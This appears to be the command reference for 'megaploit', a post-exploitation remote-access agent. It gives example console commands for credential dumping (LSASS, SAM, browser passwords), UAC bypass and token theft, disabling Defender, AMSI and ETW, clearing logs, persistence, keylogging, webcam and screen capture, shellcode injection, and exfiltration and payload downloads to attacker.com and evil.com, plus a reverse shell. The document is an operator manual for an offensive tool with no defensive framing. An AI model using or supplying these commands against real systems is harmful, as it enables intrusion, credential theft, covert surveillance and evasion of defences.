# Session Commands

Enter a session with `use <id>`. All 135 commands are available inside the session console.

## Core / Navigation

| Command | Example | Description |
|---|---|---|
| `help` | `help` | Show all commands |
| `sysinfo` | `sysinfo` | OS, hostname, user, CPU, RAM |
| `whoami` | `whoami` | Current user + admin status |
| `getpid` | `getpid` | Agent process ID |
| `getuid` | `getuid` | UID / domain\user |
| `cd <dir>` | `cd C:\Users` | Change working directory |
| `back` | `back` | Return to global prompt |
| `background` | `background` | Detach session |
| `exit` | `exit` | Terminate agent |
| `sleep <secs>` | `sleep 60` | Sleep agent |
| `beacon_sleep <secs>` | `beacon_sleep 30` | Change reconnect interval |

## File System

| Command | Example | Description |
|---|---|---|
| `ls [path]` | `ls /home/user` | List directory |
| `cat <file>` | `cat /etc/passwd` | Print file |
| `tail <file> [n]` | `tail /var/log/auth.log 50` | Last N lines |
| `find_files <path> <pattern>` | `find_files /home *.key` | Recursive search |
| `find_writable <path>` | `find_writable /var/www` | World-writable files |
| `find_suid` | `find_suid` | SUID/SGID binaries |
| `file_hash <file>` | `file_hash /etc/shadow` | SHA-256 hash |
| `search <path> <keyword>` | `search /home password` | Recursive grep |
| `write_file <path> <data>` | `write_file /tmp/a.sh "#!/bin/bash"` | Write file |
| `mkdir <path>` | `mkdir /tmp/.hidden` | Create directory |
| `rm <path>` | `rm /tmp/agent.py` | Delete file/dir |
| `chmod <mode> <file>` | `chmod 755 /tmp/exploit.sh` | Change permissions |

## File Transfer

```bash
megaploit (10.0.0.42) > upload /path/to/tool.py
megaploit (10.0.0.42) > download /etc/shadow
megaploit (10.0.0.42) > zip_download /home/victim/.ssh
megaploit (10.0.0.42) > zip_upload /tmp/tools tools.zip
megaploit (10.0.0.42) > verify /local/file.zip /remote/file.zip
```

## Process & System Intelligence

| Command | Example | Description |
|---|---|---|
| `ps` | `ps` | Full process list |
| `ps <filter>` | `ps chrome` | Filter by name |
| `kill <pid>` | `kill 1234` | Terminate process |
| `netstat` | `netstat` | TCP/UDP connections |
| `arp` | `arp` | ARP cache |
| `routes` | `routes` | Routing table |
| `ifconfig` | `ifconfig` | Network interfaces |
| `env` | `env` | Environment variables |
| `installed_software` | `installed_software` | Installed programs |
| `active_windows` | `active_windows` | Open window titles |
| `scheduled_tasks` | `scheduled_tasks` | Scheduled tasks / cron |
| `services` | `services` | Running services |
| `users` | `users` | Local user accounts |
| `logged_in` | `logged_in` | Logged-in users |
| `startup_items` | `startup_items` | Autostart entries |
| `os_info` | `os_info` | Detailed OS info |
| `dns_query <host>` | `dns_query dc.corp` | DNS from target |
| `idle_time` | `idle_time` | Seconds since last input |

## Credential Harvesting

```bash
megaploit (10.0.0.42) > hashdump
megaploit (10.0.0.42) > wifi_passwords
megaploit (10.0.0.42) > browser_creds
megaploit (10.0.0.42) > browser_creds passwords
megaploit (10.0.0.42) > browser_creds cookies
megaploit (10.0.0.42) > browser_history
megaploit (10.0.0.42) > cred_vault
megaploit (10.0.0.42) > ssh_harvest
megaploit (10.0.0.42) > sudo_sniff
megaploit (10.0.0.42) > sudo_sniff_read
megaploit (10.0.0.42) > sudo_sniff_clean
megaploit (10.0.0.42) > whoami_priv
```

### Kiwi — Windows Credential Dumper

Requires SYSTEM privileges. Compiles automatically (needs MinGW or MSVC).

```bash
megaploit (10.0.0.42) > kiwi logonpasswords   # NTLM hashes from LSASS
megaploit (10.0.0.42) > kiwi sam              # SAM hive
megaploit (10.0.0.42) > kiwi lsa              # LSA secrets
megaploit (10.0.0.42) > kiwi credman          # Credential Manager
megaploit (10.0.0.42) > kiwi tickets          # Kerberos tickets
megaploit (10.0.0.42) > kiwi wdigest          # Enable WDigest cleartext caching
megaploit (10.0.0.42) > kiwi all              # All modules
```

## Privilege Escalation

```bash
megaploit (10.0.0.42) > getsystem
megaploit (10.0.0.42) > uac_bypass cmd.exe
megaploit (10.0.0.42) > token_steal
megaploit (10.0.0.42) > token_steal 4
megaploit (10.0.0.42) > make_token DOMAIN\admin P@ssw0rd
megaploit (10.0.0.42) > rev2self
megaploit (10.0.0.42) > run_as Administrator P@ssw0rd whoami
megaploit (10.0.0.42) > whoami_priv
```

## Evasion & Anti-Forensics

```bash
megaploit (10.0.0.42) > patch_amsi
megaploit (10.0.0.42) > disable_defender
megaploit (10.0.0.42) > etw_patch
megaploit (10.0.0.42) > sandbox_check
megaploit (10.0.0.42) > hide_file C:\Users\user\AppData\agent.py
megaploit (10.0.0.42) > timestomp C:\evil.exe C:\Windows\System32\notepad.exe
megaploit (10.0.0.42) > clear_logs
megaploit (10.0.0.42) > lock_screen
megaploit (10.0.0.42) > self_destruct
```

## Persistence

```bash
megaploit (10.0.0.42) > persist WindowsUpdate agent.py
megaploit (10.0.0.42) > startup_items
megaploit (10.0.0.42) > scheduled_tasks
```

## Keylogger

```bash
megaploit (10.0.0.42) > keylog_start
megaploit (10.0.0.42) > keylog_dump
megaploit (10.0.0.42) > keylog_stop
```

## Network & Pivoting

```bash
megaploit (10.0.0.42) > ping_sweep 10.10.10.0/24
megaploit (10.0.0.42) > arp_scan 10.10.10.0/24
megaploit (10.0.0.42) > port_scan 10.10.10.5 22,80,443,3389
megaploit (10.0.0.42) > portfwd 8888 10.10.10.20 3389
megaploit (10.0.0.42) > socks5
megaploit (10.0.0.42) > smb_shares 10.10.10.10
megaploit (10.0.0.42) > net_view
megaploit (10.0.0.42) > rdp_enable
megaploit (10.0.0.42) > ssh_connect 10.10.10.20 22 root P@ssword!
megaploit (10.0.0.42) > exfil_dns "data" attacker.com
megaploit (10.0.0.42) > exfil_http http://attacker.com/upload secrets.zip
```

## Screen & Media Capture

```bash
megaploit (10.0.0.42) > screenshot
megaploit (10.0.0.42) > screenshot_region 0 0 1920 1080
megaploit (10.0.0.42) > screenshot_timelapse 10 30
megaploit (10.0.0.42) > screenrecord 30
megaploit (10.0.0.42) > stream 30 10
megaploit (10.0.0.42) > screen_stream on
megaploit (10.0.0.42) > webcam on
megaploit (10.0.0.42) > record 60
megaploit (10.0.0.42) > mic_level
```

## GUI Interaction

```bash
megaploit (10.0.0.42) > msgbox "Windows Security" "Session expired."
megaploit (10.0.0.42) > notify "Update Available" "Restart required."
megaploit (10.0.0.42) > mouse_move 960 540 click
megaploit (10.0.0.42) > type_keys text "hello"
megaploit (10.0.0.42) > type_keys hotkey win r
megaploit (10.0.0.42) > open_url https://site.com
megaploit (10.0.0.42) > play_sound C:\Windows\Media\tada.wav
megaploit (10.0.0.42) > set_wallpaper C:\Users\user\photo.jpg
```

## Clipboard

```bash
megaploit (10.0.0.42) > getclip
megaploit (10.0.0.42) > setclip "http://evil.com/payload.exe"
megaploit (10.0.0.42) > clip_watch 120
```

## Code Injection

```bash
megaploit (10.0.0.42) > inject_shellcode 1234 fc4883e4f0e8...
megaploit (10.0.0.42) > dll_inject 1234 C:\Windows\Temp\evil.dll
megaploit (10.0.0.42) > living_off_land mshta http://attacker.com/payload.hta
megaploit (10.0.0.42) > execute C:\Windows\System32\net.exe user /domain
megaploit (10.0.0.42) > reverse_shell 192.168.1.10 5555
```

## Windows Registry

```bash
megaploit (10.0.0.42) > reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
megaploit (10.0.0.42) > reg get HKCU\Software\Microsoft\Windows\CurrentVersion\Run MyApp
megaploit (10.0.0.42) > reg set HKCU\Software\Microsoft\Windows\CurrentVersion\Run Updater REG_SZ "agent.exe"
megaploit (10.0.0.42) > reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run Updater
```

**HIVE shortcuts:** `HKLM`, `HKCU`, `HKCR`, `HKU`, `HKCC`

## Desktop & Window Station

```bash
megaploit (10.0.0.42) > getdesktop
megaploit (10.0.0.42) > enumdesktops
```

## Background Jobs

```bash
megaploit (10.0.0.42) > run_bg find / -name "*.pem" 2>/dev/null
megaploit (10.0.0.42) > job_result job_abc123
```

## Advanced Shell (Meterpreter-class)

```bash
megaploit (10.0.0.42) > interactive                    # drop into PTY shell
megaploit (10.0.0.42) > run_psh "Get-LocalUser"        # PowerShell
megaploit (10.0.0.42) > run_python import os; print(os.getcwd())
megaploit (10.0.0.42) > migrate 4832                   # process migration
megaploit (10.0.0.42) > memory_read 1234 0x7fff0000 128
megaploit (10.0.0.42) > memory_write 1234 0x7fff0000 SGVsbG8=
megaploit (10.0.0.42) > irb                            # Python REPL on agent
```
